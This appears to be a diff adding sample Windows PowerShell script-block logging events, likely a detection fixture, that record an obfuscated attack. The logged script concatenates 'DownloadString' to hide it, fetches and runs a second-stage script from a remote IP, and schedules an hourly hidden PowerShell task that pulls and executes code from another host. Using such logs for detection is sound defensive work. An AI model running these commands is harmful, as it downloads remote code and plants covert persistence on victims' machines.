@@ -1,0 +1,12 @@
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System><EventID>4104</EventID><Computer>WKS-0377.corp.example</Computer><TimeCreated SystemTime="2026-09-12T09:02:44.100Z"/></System>
+  <EventData><Data Name="MessageNumber">1</Data><Data Name="MessageTotal">2</Data>
+  <Data Name="ScriptBlockText">$c = 'Down'+'loadString'; $u = 'http://' + '203.0.113.7' + '/stage2.ps1'; $w = New-Object Net.WebClient; IEX ($w.$c($</Data>
+  <Data Name="ScriptBlockId">aaaaaaaa-bbbb-cccc-dddd-000000000001</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System><EventID>4104</EventID><Computer>WKS-0377.corp.example</Computer><TimeCreated SystemTime="2026-09-12T09:02:44.100Z"/></System>
+  <EventData><Data Name="MessageNumber">2</Data><Data Name="MessageTotal">2</Data>
+  <Data Name="ScriptBlockText">u)); schtasks /create /tn Updater /tr 'powershell -nop -w hidden -c iex(irm http://update-check.example/r)' /sc hourly</Data>
+  <Data Name="ScriptBlockId">aaaaaaaa-bbbb-cccc-dddd-000000000001</Data></EventData>
+</Event>
